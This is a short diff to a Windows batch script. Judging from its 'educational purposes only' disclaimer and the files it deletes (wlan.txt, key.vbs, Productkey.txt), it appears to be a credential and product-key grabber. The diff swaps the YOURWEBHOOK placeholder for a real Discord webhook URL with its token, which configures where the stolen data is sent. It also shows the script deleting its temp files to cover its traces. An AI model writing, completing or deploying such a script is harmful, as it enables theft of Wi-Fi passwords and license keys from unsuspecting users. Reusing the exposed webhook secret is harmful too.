@@ -3,7 +3,7 @@
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
-set webhook=YOURWEBHOOK
+set webhook=https://discord.com/api/webhooks/1403926720976785418/8ySBlMCYaW3RMKRi56pzno6V7Y-Vjl33letsUJUSjQR5myttveX1i6olHTyj6PvZaVIM
 
 
 
@@ -281,3 +281,4 @@ del %localappdata%\Temp\testtttt.ps1
 del %localappdata%\Temp\wlan.txt
 del %localappdata%\Temp\key.vbs
 del %localappdata%\Temp\Productkey.txt
+
